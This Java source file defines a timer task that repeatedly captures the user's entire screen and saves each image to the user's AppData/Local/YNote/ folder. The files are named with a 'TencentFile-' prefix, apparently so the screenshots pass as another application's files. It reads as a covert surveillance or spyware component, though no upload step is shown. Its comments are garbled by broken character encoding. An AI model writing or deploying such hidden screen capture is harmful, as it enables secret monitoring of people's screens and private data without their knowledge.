package com.eko.task;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.TimerTask;

import javax.imageio.ImageIO;

import com.eko.common.Utils;

public class SnapShot extends TimerTask {
	
	final String imgPath = System.getProperty("user.home")
			+ "/AppData/Local/YNote/";
	Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();

	@Override
	public void run() {
		// TODO Auto-generated method stub
		snapShot();
	}

	public void snapShot() {
		 
		FileInputStream input = null;
		try {
			// ������Ļ��һ��BufferedImage����screenshot
			BufferedImage screenshot = (new Robot())
					.createScreenCapture(new Rectangle(0, 0, (int) dimension
							.getWidth(), (int) dimension.getHeight()));

			// �����ļ�ǰ׺�������ļ���ʽ�������Զ������ļ���
			String name = imgPath + "TencentFile-" + Utils.getInstance().getCurrentTime() + ".jpg";
			String shortx = "TencentFile-" + Utils.getInstance().getCurrentTime() + ".jpg";
			File f = new File(name);

			// ��screenshot����д��ͼ���ļ�
			ImageIO.write(screenshot, "jpg", f);
			System.out.println("Save File " + name);
		} catch (IOException | AWTException ex) {
			ex.printStackTrace();
		} finally {
			input = null;
		}
	
	}
	
}
